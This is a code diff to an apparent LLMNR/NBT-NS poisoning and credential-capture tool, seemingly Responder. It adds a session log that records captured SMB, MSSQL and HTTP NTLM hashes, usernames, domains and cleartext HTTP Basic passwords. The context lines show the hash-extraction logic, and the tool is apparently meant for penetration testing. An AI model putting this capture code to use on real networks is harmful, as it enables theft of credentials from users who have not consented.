@@ -41,6 +41,11 @@ if options.OURIP is None:
    parser.print_help()
    exit(-1)
 
+#Logger
+import logging
+logging.basicConfig(filename='Responder-Session.log',level=logging.INFO,format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
+logging.warning('Responder Started')
+
 # Set some vars.
 DomainName = options.DomainName
 OURIP = options.OURIP
@@ -140,6 +145,7 @@ class NB(SocketServer.BaseRequestHandler):
               for x in range(1):
                  socket.sendto(str(buff), self.client_address)
               print "NBT-NS Answer sent to: ", self.client_address[0]
+              logging.warning('NBT-NS Answer sent to: %s'%(self.client_address[0]))
 
 ##################################################################################
 #SMB Stuff
@@ -271,6 +277,7 @@ def ParseHash(data,client):
     Bcc = struct.unpack('<H',data[63:65])[0]
     if NthashLen > 60:
        Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
+       logging.warning('[+]SMB-NTLMv2 hash captured from :%s'%(client))
        print "[+]SMB-NTLMv2 hash captured from :",client
        outfile = "SMB-NTLMv2-Client-"+client+".txt"
        pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
@@ -279,10 +286,14 @@ def ParseHash(data,client):
        Writehash = Username+"::"+Domain+":"+NumChal+":"+Hash.encode('hex')[:32].upper()+":"+Hash.encode('hex')[32:].upper()
        WriteData(outfile,Writehash)
        print "[+]SMB-NTLMv2 complete hash is :",Writehash
+       logging.warning('[+]SMB-NTLMv2 complete hash is :%s'%(Writehash))
        print "Username : ",Username
+       logging.warning('[+]SMB-NTLMv2 Username:%s'%(Username))
        print "Domain (if joined, if not then computer name) : ",Domain
+       logging.warning('[+]SMB-NTLMv2 Domain (if joined, if not then computer name) :%s'%(Domain))
     if NthashLen == 24:
        print "[+]SMB-NTLMv1 hash captured from : ",client
+       logging.warning('[+]SMB-NTLMv1 hash captured from :%s'%(client))
        outfile = "SMB-NTLMv1-Client-"+client+".txt"
        pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
        var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
@@ -290,13 +301,17 @@ def ParseHash(data,client):
        writehash = Username+"::"+Domain+":"+data[65:65+LMhashLen].encode('hex').upper()+":"+data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()+":"+NumChal
        WriteData(outfile,writehash)
        print "[+]SMB complete hash is :", writehash
+       logging.warning('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
        print "Username : ",Username
+       logging.warning('[+]SMB-NTLMv1 Username:%s'%(Username))
        print "Domain (if joined, if not then computer name) : ",Domain
+       logging.warning('[+]SMB-NTLMv1 Domain (if joined, if not then computer name) :%s'%(Domain))
     packet = data[:]
     a = re.search('(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
     if a:
        quote = "Share requested: "+a.group(0)
        print quote.replace('\x00','')
+       logging.warning(quote.replace('\x00',''))
   except Exception:
            raise
 
@@ -537,38 +552,45 @@ def ParseSQLHash(data,client):
     LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
     NthashLen = struct.unpack('<H',data[30:32])[0]
     if NthashLen == 24:
-       print "[+]MsSQL NTLMv1 hash captured from :",client
-       print "LM hash is: ",LMHash
+       print "[+]MSSQL NTLMv1 hash captured from :",client
+       logging.warning('[+]MsSQL NTLMv1 hash captured from :%s'%(client))
        NthashOffset = struct.unpack('<H',data[32:34])[0]
        NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
-       print "NT Hash is: ", NtHash
        DomainLen = struct.unpack('<H',data[36:38])[0]
        DomainOffset = struct.unpack('<H',data[40:42])[0]
        Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
        print "Domain is :", Domain
+       logging.warning('[+]MSSQL NTLMv1 Domain is :%s'%(Domain))
        UserLen = struct.unpack('<H',data[44:46])[0]
        UserOffset = struct.unpack('<H',data[48:50])[0]
        User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
        print "User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
+       logging.warning('[+]MSSQL NTLMv1 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
        outfile = "MSSQL-NTLMv1-Client-"+client+".txt"
        WriteData(outfile,User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal)
+       print '[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal)
+       logging.warning('[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal))
     if NthashLen > 60:
        print "[+]MSSQL NTLMv2 Hash captured from :",client
+       logging.warning('[+]MsSQL NTLMv2 hash captured from :%s'%(client))
        DomainLen = struct.unpack('<H',data[36:38])[0]
        NthashOffset = struct.unpack('<H',data[32:34])[0]
        NthashLen = struct.unpack('<H',data[30:32])[0]
        Hash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
        DomainOffset = struct.unpack('<H',data[40:42])[0]
        Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
-       print "Domain is :", Domain
+       print "[+]MSSQL NTLMv2 Domain is :", Domain
+       logging.warning('[+]MSSQL NTLMv2 Domain is :%s'%(Domain))
        UserLen = struct.unpack('<H',data[44:46])[0]
        UserOffset = struct.unpack('<H',data[48:50])[0]
        User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
-       print "User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
+       print "[+]MSSQL NTLMv2 User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
+       logging.warning('[+]MSSQL NTLMv2 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
        outfile = "MSSQL-NTLMv2-Client-"+client+".txt"
        Writehash = User+"::"+Domain+":"+NumChal+":"+Hash[:32].upper()+":"+Hash[32:].upper()
        WriteData(outfile,Writehash)
-       print "Complete Hash is :", Writehash
+       print "[+]MSSQL NTLMv2 Complete Hash is : ", Writehash
+       logging.warning('[+]MSSQL NTLMv2 Complete Hash is : %s'%(Writehash))
 
 #MS-SQL server class.
 class MSSQL(SocketServer.BaseRequestHandler):
@@ -640,6 +662,7 @@ def Parse_LLMNR_Name(data,addr):
    NameLen = struct.unpack('>B',data[12])[0]
    Name = data[13:13+NameLen]
    print "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(addr[0],Name)
+   logging.warning('LLMNR poisoned answer sent to this IP: %s. The requested name was : %s.'%(addr[0],Name))
    return Name
 
 def Parse_IPV6_Addr(data):
@@ -798,38 +821,47 @@ def ParseHTTPHash(data,client):
     NTHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
     if NthashLen == 24:
        print "[+]HTTP NTLMv1 hash captured from :",client
+       logging.warning('[+]HTTP NTLMv1 hash captured from :%s'%(client))
        NtHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
        HostNameLen = struct.unpack('<H',data[46:48])[0]
        HostNameOffset = struct.unpack('<H',data[48:50])[0]
        Hostname = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
        print "Hostname is :", Hostname
+       logging.warning('[+]HTTP NTLMv1 Hostname is :%s'%(Hostname))
        UserLen = struct.unpack('<H',data[36:38])[0]
        UserOffset = struct.unpack('<H',data[40:42])[0]
        User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
        print "User is :", data[UserOffset:UserOffset+UserLen].replace('\x00','')
+       logging.warning('[+]HTTP NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
        outfile = "HTTP-NTLMv1-Client-"+client+".txt"
        WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
        WriteData(outfile,WriteHash)
-       print "Captured hash is : ", WriteHash
+       print "Complete hash is : ", WriteHash
+       logging.warning('[+]HTTP NTLMv1 Complete hash is :%s'%(WriteHash))
     if NthashLen > 24:
        print "[+]HTTP NTLMv2 hash captured from :",client
+       logging.warning('[+]HTTP NTLMv2 hash captured from :%s'%(client))
        NthashLen = 64
        DomainLen = struct.unpack('<H',data[28:30])[0]
        DomainOffset = struct.unpack('<H',data[32:34])[0]
        Domain = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
        print "Domain is : ", Domain
+       logging.warning('[+]HTTP NTLMv2 Domain is :%s'%(Domain))
        UserLen = struct.unpack('<H',data[36:38])[0]
        UserOffset = struct.unpack('<H',data[40:42])[0]
        User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
        print "User is :", User
+       logging.warning('[+]HTTP NTLMv2 User is : %s'%(User))
        HostNameLen = struct.unpack('<H',data[44:46])[0]
        HostNameOffset = struct.unpack('<H',data[48:50])[0]
        HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
        print "Hostname is :", HostName
+       logging.warning('[+]HTTP NTLMv2 Hostname is :%s'%(HostName))
        outfile = "HTTP-NTLMv2-Client-"+client+".txt"
        WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
        WriteData(outfile,WriteHash)
        print "Complete hash is : ", WriteHash
+       logging.warning('[+]HTTP NTLMv2 Complete hash is :%s'%(WriteHash))
 
 # Function used to check if we answer with a Basic or NTLM auth. 
 def Basic_Ntlm(Basic):
@@ -858,6 +890,7 @@ def PacketSequence(data,client):
        outfile = "HTTP-Clear-Text-Password-"+client+".txt"
        WriteData(outfile,b64decode(''.join(b)))
        print "[+]HTTP-User & Password:", b64decode(''.join(b))
+       logging.warning('[+]HTTP-User & Password: %s'%(b64decode(''.join(b))))
 
     else:
        return str(Basic_Ntlm(Basic))
